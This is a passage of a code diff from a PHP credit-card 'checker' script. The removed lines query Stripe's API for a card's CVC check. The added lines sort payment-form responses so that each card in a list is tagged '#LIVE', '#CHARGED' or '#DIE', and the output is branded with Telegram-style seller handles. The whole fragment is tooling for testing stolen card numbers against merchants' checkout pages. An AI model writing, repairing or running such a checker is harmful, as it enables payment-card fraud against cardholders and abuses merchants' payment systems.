-	curl_setopt($curl_3, CURLOPT_CONNECTTIMEOUT,15);
-		
-	curl_setopt($curl_3, CURLOPT_URL, 'https://api.stripe.com/v1/customers/'.$customer_ID.'/sources/'.$card_ID);
-	curl_setopt($curl_3, CURLOPT_RETURNTRANSFER, 1);
-	curl_setopt($curl_3, CURLOPT_CUSTOMREQUEST, 'GET');
-	curl_setopt($curl_3, CURLOPT_USERPWD, $secret_key . ':' . '');
-	$headers = array();
-	$headers[] = 'Content-Type: application/x-www-form-urlencoded';
-	curl_setopt($curl_3, CURLOPT_HTTPHEADER, $headers);
-	$curl_3_exec = curl_exec($curl_3);
-	curl_close($curl_3);
-	if (strpos($curl_3_exec, "rate_limit"))   
-	{  
-		$retry_count++;  
-		continue;  
-	}  
-	break; 
+    echo '#LIVE</span>  </span>CC:  '.$lista.'</span><br>Result:CVV LIVE✅ 💯 @NOVA_PVT_LTD</span><br>';
+exit;
 }
-$result_3 = json_decode($curl_3_exec, true);
-/*=========================================================================*/
 
-/*=========================================================================*/
-if(!isset($result_3['id'])){
-	$end_time = microtime(true);
-    $execution_time = $end_time - $start_time;
-    $execution_time = number_format($execution_time, 2);
-    die('<span><i class="fa fa-times" aria-hidden="true"></i>DEAD</span>  <span>:  '.$lista.'</span>  <br>GATEWAY: '.$gateway.' <br>RESULT: Client not found</span><br>RETRY: [ '.$retry_count.' ]<br>'.$binlookup.'<br>Time Taken: '.$execution_time.'s<br><br>');
+elseif(strpos($result2, "Thank you for your support!")) {
+
+    echo '#LIVE</span>  </span>CC:  '.$lista.'</span><br>Result:CVV LIVE ✅ 💯 @NOVA_PVT_LTD</span><br>';
+exit;
 }
-/*=========================================================================*/
 
-/*=========================================================================*/
-$cvc_result_3 = $result_3['cvc_check'];
-/*=========================================================================*/
 
-/*=========================================================================*/
-if($cvc_result_3 == "pass"||$cvc_result_3 == "success"){
-	$end_time = microtime(true);
-	$execution_time = $end_time - $start_time;
-	$execution_time = number_format($execution_time, 2);
-	echo '<span><i class="fa fa-check" aria-hidden="true"></i>CVV LIVE</span>  <span>:  '.$lista.'</span>  <br>GATEWAY: '.$gateway.' <br>RESULT: [ CVC_CHECK ][ '.strtoupper($cvc_result_3).' ]</span><br>RETRY: [ '.$retry_count.' ]<br>'.$binlookup.'<br>Time Taken: '.$execution_time.'s<br><br>';
-}else{
-	$end_time = microtime(true);
-	$execution_time = $end_time - $start_time;
-	$execution_time = number_format($execution_time, 2);
-	echo '<span><i class="fa fa-times" aria-hidden="true"></i>DEAD</span>  <span>:  '.$lista.'</span>  <br>GATEWAY: '.$gateway.' <br>RESULT: [ CVC_CHECK ][ '.strtoupper($cvc_result_3).' ]</span><br>RETRY: [ '.$retry_count.' ]<br>'.$binlookup.'<br>Time Taken: '.$execution_time.'s<br><br>';
+
+
+elseif(strpos($result2, "/wishlist-member/?reg=")) {
+
+    echo '#LIVE</span>  </span>CC:  '.$lista.'</span><br>Result:CVV ✅ @M3dooo_00</span><br>';
+exit;
 }
-/*=========================================================================*/
+
+elseif(strpos($result2, "id.")) {
+
+    echo '#DIE</span>  </span>CC:  '.$lista.'</span><br>Result: invalid exp_year@M3dooo_00</span><br>';
+exit;
+}
+
+elseif(strpos($result2, "Thank You")) {
+
+    echo '#LIVE</span>  </span>CC:  '.$lista.'</span><br>Result:CVV LIVE✅ 💯 @NOVA_PVT_LTD</span><br>';
+exit;
+}
+
+elseif(strpos($result2, "incorrect_cvc")) {
+
+    echo '#LIVE</span>  </span>CC:  '.$lista.'</span><br>Result:incorrect_cvc✅ 💯 @NOVA_PVT_LTD</span><br>';
+exit;
+}
+
+elseif(strpos($result2, "Card is declined by your bank, please contact them for additional information.")) {
+
+    echo '#CHARGED</span>  </span>CC:  '.$lista.'</span><br>Result:Card is declined by your bank ✅  💯 @NOVA_PVT_LTD</span><br>';
+exit;
+}
+
+elseif(strpos($result2, "Your card does not support this type of purchase.")) {
+
+    echo '#CHARGED</span>  </span>CC:  '.$lista.'</span><br>Result:Your card does not support ✅ 💯 @NOVA_PVT_LTD </span><br>';
+exit;
+}
+
+elseif(strpos($result2, "Your card is not supported.")) {
+
+    echo '#LIVE</span>  </span>CC:  '.$lista.'</span><br>Result:CARD NOT SUPPORTED 💯 @NOVA_PVT_LTD </span><br>';
+exit;
+}
+
+
+else {
+
+    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: CARD DECLINED ❌ 💯 @NOVA_PVT_LTD</span><br>';
+
+}
+
+
+
+curl_close($ch);
+ob_flush();
+#echo $result1;
+#echo $result2; 
 ?>
